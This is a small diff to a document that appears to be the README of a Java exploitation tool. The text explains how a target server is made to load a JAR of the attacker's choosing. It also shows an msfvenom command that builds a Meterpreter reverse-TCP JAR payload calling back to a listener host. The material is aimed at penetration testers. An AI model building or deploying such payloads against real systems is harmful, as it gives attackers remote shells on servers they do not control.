@@ -48,7 +48,7 @@ Ability to call command execution：
 
 The `main` method used to cause the target server to dynamically load our specified JAR package and execute the specified class name.
 
-For all you lovely testers `msfvenom` as part of the metasploit package [Metasploit](https://github.com/rapid7/metasploit-framework) with the `java/meterpreter/reverse_tcp` JAR payload：
+For all you lovely testers `msfvenom` as part of the metasploit package with the `java/meterpreter/reverse_tcp` JAR payload：
 
     $ msfvenom --payload="java/meterpreter/reverse_tcp" LHOST=192.168.130.1 LPORT=4444 -t jar > java_meterpreter_reverse_tcp.jar
     
